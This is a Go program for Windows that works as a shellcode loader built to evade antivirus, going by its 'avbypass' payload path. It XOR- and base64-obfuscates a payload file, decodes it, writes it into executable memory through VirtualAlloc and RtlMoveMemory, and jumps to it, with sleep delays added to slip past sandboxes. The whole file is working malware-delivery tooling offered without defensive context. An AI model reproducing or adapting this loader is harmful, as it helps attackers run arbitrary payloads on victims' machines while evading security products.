package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var XorKey = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}

func getDeCode(src string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(src)
	xor_shellcode := []byte(data1)
	var shellcode []byte
	for i := 0; i < len(xor_shellcode); i++ {
		shellcode = append(shellcode, xor_shellcode[i]^XorKey[1]^XorKey[2])
	}
	return shellcode
}

func getEncode(src string) string {
	shellcode := []byte(src)
	var xor_shellcode []byte
	for i := 0; i < len(shellcode); i++ {
		xor_shellcode = append(xor_shellcode, shellcode[i]^XorKey[2]^XorKey[1])
	}
	bdata := base64.StdEncoding.EncodeToString(xor_shellcode)

	return bdata
}


var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)


func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func jiazaiexe(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkError(err)
	}
	delay()

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkError(err)

	delay()
	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func delay() int64 {
	time.Sleep(time.Duration(2) * time.Second)

	dd := time.Now().UTC().UnixNano()
	return dd + 123456

}

func getFileShellCode(file string) []byte {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Print(err)
	}
	return data
}


func main() {
	endata:=getEncode(string(getFileShellCode("E:\\githubproject\\avbypass\\payload.bin")))
	fmt.Println(endata)
	//endata:=""
	shellCodeHex := getDeCode(endata)
	delay()
	jiazaiexe(shellCodeHex)
}
